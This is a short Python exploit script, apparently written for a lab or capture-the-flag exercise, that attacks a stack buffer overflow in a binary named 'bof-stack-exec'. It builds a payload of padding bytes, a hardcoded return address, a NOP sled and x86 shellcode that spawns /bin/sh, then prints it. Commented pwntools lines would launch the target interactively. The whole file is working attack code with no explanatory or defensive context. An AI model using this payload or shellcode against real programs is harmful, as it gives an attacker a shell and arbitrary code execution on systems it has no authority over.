#!/usr/bin/env python

import struct
import sys
#import pwn

shellcode_address = 0xbffff070+28+4#0xbffff104#0xbffff0a0
given_shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
my_shellcode = (
	"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
	"\x73\x68\x68\x2f\x62\x69\x6e\x89"
	"\xe3\xb0\x0b\xcd\x80"
	)

nop_sled = '\x90' * 32
chosen_shellcode = my_shellcode
payload = 'A'*28 + struct.pack('I', shellcode_address) + nop_sled + chosen_shellcode

sys.stdout.write(payload)

#p = pwn.process('./bof-stack-exec', payload)
#p.interactive()
